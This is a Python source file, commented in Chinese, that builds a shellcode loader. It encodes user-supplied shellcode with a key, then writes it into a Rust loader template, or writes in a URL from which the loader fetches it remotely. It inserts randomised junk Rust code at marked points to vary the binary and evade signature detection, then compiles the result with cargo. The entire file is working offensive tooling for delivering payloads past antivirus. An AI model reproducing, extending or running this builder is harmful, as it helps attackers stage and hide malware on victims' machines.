
import os
import shutil
import subprocess
import uuid
import random

def create_unique_identifier(tag, existing_identifiers):
    """创建唯一标识符并确保其不在existing_identifiers列表中"""
    while True:
        identifier = f'_{tag}_{random.randint(10000, 99999)}'
        if identifier not in existing_identifiers:
            existing_identifiers.add(identifier)
            return identifier

used_identifiers = set()

# rust混淆代码模板
rust_obfuscation_snippets = [
    lambda: f"""
    // 无实际作用的代码
    let {create_unique_identifier('x', used_identifiers)}: i32 = {{ let mut temp = 0; for _ in 0..10 {{ temp += 1; }} temp }};
    """,

    lambda: """
    // 永远不会执行的代码块
    if false {
        println!("This will never be printed.");
    }
    """,

    lambda used_identifiers=used_identifiers, create_unique_identifier=create_unique_identifier, tag='unused_fibonacci': (
        lambda _fib_name=None: f"""
        // 计算并不需要的斐波那契数
        fn {_fib_name if _fib_name else create_unique_identifier(tag, used_identifiers)}(n: i32) -> i32 {{
            match n {{
                0 => 0,
                1 => 1,
                _ => {_fib_name if _fib_name else create_unique_identifier(tag+'_recur', used_identifiers)}(n - 1) + {_fib_name if _fib_name else create_unique_identifier(tag+'_recur', used_identifiers)}(n - 2),
            }}
        }}
        let _fib_compute_name = {_fib_name if _fib_name else create_unique_identifier(tag+'_compute', used_identifiers)}(5);
        """
    )(create_unique_identifier(tag, used_identifiers)),

    lambda used_identifiers=used_identifiers, create_unique_identifier=create_unique_identifier: (
        lambda _point_struct_name=None: f"""
        // 创建一个无用的结构体并为其实现方法
        struct {_point_struct_name if _point_struct_name else create_unique_identifier('Point', used_identifiers)} {{
            x: f64,
            y: f64,
        }}

        impl {_point_struct_name if _point_struct_name else create_unique_identifier('Point', used_identifiers)} {{
            fn distance(&self) -> f64 {{
                (self.x.powi(2) + self.y.powi(2)).sqrt()
            }}
        }}
        let _point = {_point_struct_name if _point_struct_name else create_unique_identifier('Point', used_identifiers)} {{ x: 1.0, y: 2.0 }};
        let _distance = _point.distance();
        """
    )(create_unique_identifier('Point', used_identifiers))
    # 更多的代码片段...
]

def insert_obfuscation_at_markers(original_code, snippets, marker="// INSERT_OBFUSCATION_HERE"):
    lines = original_code.split('\n')
    obfuscated_lines = []

    for line in lines:
        # 查找我们的特殊标记
        if marker in line:
            # 插入原标记行之前添加起始标记
            obfuscated_lines.append('// -- OBFUSCATION CODE START --')
            # 随机选择并调用一个代码片段生成函数插入一个混淆代码片段
            obfuscated_lines.append(random.choice(snippets)().strip())
            # 插入原标记行之后添加结束标记
            obfuscated_lines.append('// -- OBFUSCATION CODE END --')
        else:
            obfuscated_lines.append(line)
    
    return '\n'.join(obfuscated_lines)   





def compile(key,user_encoder_path, user_loader_path, user_binary_path,user_shellcode_file,user_encode_shellcode_file,remote,remote_shellcode_url):    
    
    new_filename = ''
    shecode_encoder_exe_path = os.path.join(user_encoder_path, "shellcode_encoder.exe")
    rs_tmp_path = os.path.join(user_loader_path,"src", "main_temp.rs")
    rs_path = os.path.join(user_loader_path,"src", "main.rs")
    rs_compile_file_path = os.path.join(user_loader_path,"Cargo.toml")
    binary_file_path = os.path.join(user_loader_path,"target", "release", "binaryfile.exe")
    
    with open(user_encode_shellcode_file, "w", encoding="utf-8") as f:
        subprocess.run([shecode_encoder_exe_path, key,  user_shellcode_file], stdout=f, check=True)

    if remote:
        new_filename = f"{uuid.uuid4().hex[:10]}"
        new_file_path = os.path.join(user_binary_path, new_filename)
        shutil.move(user_encode_shellcode_file, new_file_path)
        remote_shellcode_url += new_filename


        # 读取syscall.c文件的内容
        with open(rs_tmp_path, "r", encoding="utf-8") as syscall_file:
            syscall_contents = syscall_file.read()
        
        # 替换"#shellcode#"为实际的shellcode字符串
        syscall_key_updated = syscall_contents.replace('"#decode_key#"', f'"{key}"')
        syscall_shellcode_tmp = syscall_key_updated.replace('"#URL#"', f'"{remote_shellcode_url}"')
        syscall_shellcode_updated = insert_obfuscation_at_markers(syscall_shellcode_tmp, rust_obfuscation_snippets)
        # 将更新后的内容写回syscall.c文件
        with open(rs_path, "w", encoding="utf-8") as syscall_file:
            syscall_file.write(syscall_shellcode_updated)
    else:
        #替换模板里的shellcode标识符为加密后的shellcode
        with open(user_encode_shellcode_file, "r", encoding="utf-8") as shellcode_file:
            shellcode_contents = shellcode_file.read().strip()
        
        with open(rs_tmp_path, "r", encoding="utf-8") as syscall_file:
            syscall_contents = syscall_file.read()
        
        # 替换"#shellcode#"为实际的shellcode字符串
        syscall_key_updated = syscall_contents.replace('"#decode_key#"', f'"{key}"')
        syscall_shellcode_tmp = syscall_key_updated.replace('#encoded_shellcode#', shellcode_contents)
        # 查找标记位置并插入混淆代码
        syscall_shellcode_updated = insert_obfuscation_at_markers(syscall_shellcode_tmp, rust_obfuscation_snippets)

        # 将更新后的内容写回syscall.c文件
        with open(rs_path, "w", encoding="utf-8") as syscall_file:
            syscall_file.write(syscall_shellcode_updated)

    subprocess.run(["cargo", "build", "--manifest-path", rs_compile_file_path, "--release"], check=True)
    
    shutil.copy(binary_file_path, user_binary_path)
    return new_filename